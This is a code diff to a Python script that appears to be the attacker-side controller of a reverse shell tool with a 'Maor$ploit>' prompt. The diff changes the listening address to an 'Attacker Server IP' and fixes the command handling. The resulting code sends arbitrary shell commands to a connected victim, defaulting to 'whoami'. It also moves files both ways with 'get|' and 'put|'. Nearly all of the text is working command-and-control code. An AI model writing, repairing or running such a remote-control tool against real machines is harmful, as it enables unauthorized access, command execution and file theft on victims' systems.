@@ -46,29 +46,30 @@ def disconnect(conn):
 def connect():
     global s
     s = socket.socket()
-    s.bind(("127.0.0.1", 1234)) # Edit here the Attacker Server IP and listening port
+    s.bind(("192.168.1.13", 1234)) # Edit here the Attacker Server IP and listening port
     s.listen(1)
     print("[*] Listening for TCP connection")
     conn, addr = s.accept()
     print("[+] Connection received from ", addr)
     while True:
-        try:
-            command = input("Maor$ploit> ")
-            if 'terminate' or 'exit' in command:
-                disconnect(conn)
-                break
-            elif 'get|' in command:
-                transfer(conn, command)
-            elif 'put|' in command:
-                upload(conn, command)
-                print(conn.recv(1024).decode())
-            else:
-                if command == '':
-                    command = 'whoami'
-                conn.send(command.encode())
-                print(conn.recv(1024).decode())
-        except KeyboardInterrupt:
+        command = input("Maor$ploit> ")
+        # if 'terminate' or 'exit' in command:
+        if command.startswith("terminate") or command.startswith("exit"):
             disconnect(conn)
+            break
+        # elif 'get|' in command:
+        elif command.startswith("get|"):
+            transfer(conn, command)
+        # elif 'put|' in command:
+        elif command.startswith("put|"):
+            upload(conn, command)
+            print(conn.recv(1024).decode())
+        else:
+            if command == '':
+                command = 'whoami'
+            conn.send(command.encode())
+            print(conn.recv(1024).decode())
+
 
 
 def main():
